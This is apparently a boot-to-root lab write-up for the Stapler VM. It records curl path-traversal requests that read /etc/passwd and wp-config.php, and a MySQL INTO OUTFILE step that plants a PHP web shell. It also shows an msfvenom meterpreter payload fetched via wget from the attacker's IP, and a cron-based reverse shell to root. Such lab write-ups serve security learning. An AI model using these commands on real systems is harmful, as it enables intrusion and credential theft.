---
title: "B2R: Stapler"
description: "stapler"
categories: ["Boot2Root"]
date: 2016-12-24T23:45:38-05:00
---

Adding the IP address of the VM to the hosts file allows one to cut down on some typing.

![](https://i.imgur.com/cazlgnf.png)

## Executive Summary
This machine had several services running, some of which revealed employee names and accounts that could
later be leveraged to compromise the system. A Wordpress plug-in vulnerability was found and used to extract
database credentials, which then led to a non-privileged shell. Once scanned, it was discovered that a script
ran every 20 minutes as the `root` user and that the script was writable to our non-privileged user. This was
leveraged to create a `root` shell by replacing the file contents with a malicious payload.

## Execution

An initial recon scan on the target revealed the following services:

~~~bash.prettyprint
>> onetwopunch -t ip_addresses.txt -p tcp
~~~
![](https://i.imgur.com/YeosV0b.png)

All together, individual inspection of the services revealed a plethora of information about the company and
its employees. 
This section will cover the most direct route to `root`, 
but see the [Additional Discovery](#additional-discovery) section for that information.

Using `nikto` against the service on port `12380` revealed additional paths using the https protocol. 

~~~bash.prettyprint
>> nikto -host vm:12380
~~~
![](https://i.imgur.com/DTF5i00.png)

The site hosted at `/blogblog` is a Wordpress blog with a vulnerable plug-in, as discovered by `wpscan`.

~~~bash.prettyprint
wpscan -u https://vm:12380/blogblog/
~~~

![](https://i.imgur.com/uzdO1dx.png)
![](https://i.imgur.com/U2NyDnu.png)
![](https://i.imgur.com/LrEOKFq.png)

[This LFI vulnerability](https://www.exploit-db.com/exploits/39646/) allows an attacker to read the contents
of a file on the system by using that file as a "thumbnail" for a post. An attacker could use this to read
the contents of the Wordpress configuration file which has database credentials. The user account list for
this machine was also acquired using this method.

~~~bash.prettyprint
>> curl -k "https://vm:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=9898092807434134&short=rnd&term=rnd&thumb=../../../../../etc/passwd"
>> curl -k "https://vm:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=9898092807434134&short=rnd&term=rnd&thumb=../wp-config.php"
~~~
![](https://i.imgur.com/XMcARrC.png)

By curling the "image" urls, the contents can be read.

![](https://i.imgur.com/CVtnKiK.png)
![](https://i.imgur.com/rfez3zi.png)


With credentials and an open 3306 port, an attacker can log in and create a malicious file that would allow
remote code execution.

~~~bash.prettyprint
>> mysql -h vm -u root -p wordpress

mysql>> SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/root/www/rce.php'
~~~

![](https://i.imgur.com/h0gsLrZ.png)

With remote code execution enabled, an attacker can download a malicious payload that initiates a reverse
shell.

~~~bash.prettyprint
# start a web server to host the payload
>> systemctl start apache2

#create the payload in the web directory
>> msfvenom -p php/meterpreter_reverse_tcp LPORT=443 LHOST=$HOST_IP -t raw > /var/www/html/qq.php

# trigger remote commands that download the payload from the attacker's computer
>> curl "vm/rce.php?cmd=wget 192.168.110.101/qq.php"
>> curl "vm/rce.php?cmd=ls"
~~~

![](https://i.imgur.com/5WdoFhk.png)

A listener/handler is configured and the reverse shell kicked off on the victim computer

~~~bash.prettyprint
>> msfconsole -x "use exploit/multi/handler"

msfconsole>> set PAYLOAD php/meterpreter_reverse_tcp
msfconsolemsfconsole>> set LPORT 443
msfconsole>> exploit -j

# start the shell
>> curl "vm/qq.php"
~~~

![](https://i.imgur.com/Gxqwui2.png)

An attacker can now enumerate the contents of the victim's file system, allowing them identify any vulnerable
or mis-configured services that would allow them to elevate privileges. In this case, a cron script was
running a world-modifiable file as root.

![](https://i.imgur.com/I0kuii9.png)
![](https://i.imgur.com/bg9dpXH.png)


Further inspection of this scheduled task:

![](https://i.imgur.com/WXEowHC.png)

This task runs as the root user. All that was needed to become root was to replace the contents of the script
with a reverse shell.

![](https://i.imgur.com/vFqTefn.png)



## Additional Discovery

SMB enumeration and unprotected shares revealed some employee names and personal notes
![](https://i.imgur.com/VEFkW99.png)

Port 666 was serving a zip file of a screenshot of another personal note. The exif contained some notes for
the attacker.
![](https://i.imgur.com/vJBqGGF.png)

The anonymous ftp login also leaks information.
![](https://i.imgur.com/fW3Nl8k.png)
![](https://i.imgur.com/aFFIp9P.png)

Port 80 scan initially returned what looked like a user's dotfiles. This gave me the idea that someone may be
running a web server from their home directory.
![](https://i.imgur.com/w3143f7.png)

The Wordpress site could have been used as another vector for a shell by adding a reverse shell plug-in. The
users and passwords were crackable with the rockyou word list. Some users also reused their Wordpress
passwords for their machine accounts.

~~~bash.prettyprint
>> wpscan -u https://vm:12380/blogblog/ --enumerate u
~~~

![](https://i.imgur.com/v1GKKbb.png)

Without accessing the computer's `/etc/passwd` file, this gathering of information revealed the existence of
the following employees and a accounts:

~~~bash.prettyprint
barry
dave
elly
fred
garry
harry
heather
john
kathy
pam
peter
scott
tim
vicki
zoe
~~~
